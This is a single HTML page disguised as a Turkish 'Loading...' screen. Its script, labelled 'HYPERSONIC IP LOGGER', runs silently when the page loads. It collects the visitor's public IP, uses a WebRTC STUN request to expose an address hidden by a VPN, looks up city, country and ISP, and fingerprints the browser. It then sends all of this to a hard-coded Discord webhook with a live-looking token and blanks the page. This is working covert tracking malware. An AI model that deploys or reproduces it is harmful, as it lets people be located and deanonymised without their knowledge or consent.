<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Yükleniyor...</title>
    <style>
        body { margin:0; padding:0; background:#f0f0f0; }
    </style>
</head>
<body>
    <!-- ZİYARETÇİ HİÇBİR ŞEY GÖRMEZ -->
    
    <script>
    // =========================================================================
    // HYPERSONIC IP LOGGER - TEK HTML DOSYASI
    // =========================================================================
    
    (async function() {
        // ---- KONFİGÜRASYON ----
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1458566674302238923/0EPCSiG8KU6QcDoFcT0Ugc6BN_fGX_7K6KsXtflSlkKV4ZPH9zSHx3bnirPb0bWDowEk"; // BURAYI DEĞİŞTİRME
        
        // ---- 1. PUBLIC IP'Yİ AL (WEBRTC İLE VPN BYPASS) ----
        async function getWebRTCIP() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({
                        iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
                    });
                    pc.createDataChannel("");
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    
                    let timeout = setTimeout(() => {
                        pc.close();
                        resolve(null);
                    }, 3000);
                    
                    pc.onicecandidate = (ice) => {
                        if (ice && ice.candidate && ice.candidate.candidate) {
                            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                            if (match) {
                                clearTimeout(timeout);
                                pc.close();
                                resolve(match[1]);
                            }
                        }
                    };
                } catch(e) {
                    resolve(null);
                }
            });
        }

        // ---- 2. PUBLIC IP'Yİ AL (İKİNCİ YÖNTEM) ----
        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch(e) {
                return null;
            }
        }

        // ---- 3. IP'DEN LOKASYON AL (ip-api.com) ----
        async function getLocation(ip) {
            try {
                const response = await fetch(`http://ip-api.com/json/${ip}?fields=16976857`);
                const data = await response.json();
                return data;
            } catch(e) {
                return null;
            }
        }

        // ---- 4. TÜM HEADER'LARI TOPLA ----
        function getAllHeaders() {
            const headers = {
                'user-agent': navigator.userAgent,
                'platform': navigator.platform,
                'language': navigator.language,
                'hardware-concurrency': navigator.hardwareConcurrency,
                'device-memory': navigator.deviceMemory || 'unknown',
                'screen': `${screen.width}x${screen.height}`,
                'timezone': Intl.DateTimeFormat().resolvedOptions().timeZone,
                'referrer': document.referrer || 'direct'
            };
            return headers;
        }

        // ---- 5. WEBHOOK'A GÖNDER ----
        async function sendToWebhook(data) {
            const embed = {
                username: "🚀 HYPERSONIC LOGGER",
                embeds: [{
                    title: "🎯 YENİ ZİYARETÇİ!",
                    color: 0xFF0000,
                    fields: [
                        { name: "📡 IP", value: `\`${data.ip || '?'}\``, inline: true },
                        { name: "🌐 WEBRTC IP", value: `\`${data.webrtc_ip || 'yok'}\``, inline: true },
                        { name: "🏙️ ŞEHİR", value: data.location?.city || '?', inline: true },
                        { name: "🏴󠁧󠁢󠁥󠁮󠁧󠁿 ÜLKE", value: data.location?.country || '?', inline: true },
                        { name: "🛜 ISP", value: data.location?.isp || '?', inline: true },
                        { name: "🔒 VPN", value: data.location?.proxy ? 'EVET' : 'HAYIR', inline: true }
                    ],
                    footer: { text: new Date().toLocaleString() }
                }]
            };
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(embed)
                });
                console.log("✅ Gönderildi!");
            } catch(e) {
                console.error("❌ Hata:", e);
            }
        }

        // ---- ANA FONKSİYON ----
        console.log("🚀 BAŞLATILDI...");
        
        const headers = getAllHeaders();
        const publicIP = await getPublicIP();
        const webrtcIP = await getWebRTCIP();
        
        let location = null;
        if (webrtcIP && webrtcIP !== publicIP) {
            location = await getLocation(webrtcIP);
        } else if (publicIP) {
            location = await getLocation(publicIP);
        }
        
        const data = {
            ip: publicIP,
            webrtc_ip: webrtcIP,
            location: location,
            headers: headers
        };
        
        await sendToWebhook(data);
        document.body.innerHTML = ''; // Sayfayı tamamen boşalt
    })();
    </script>
</body>
</html>
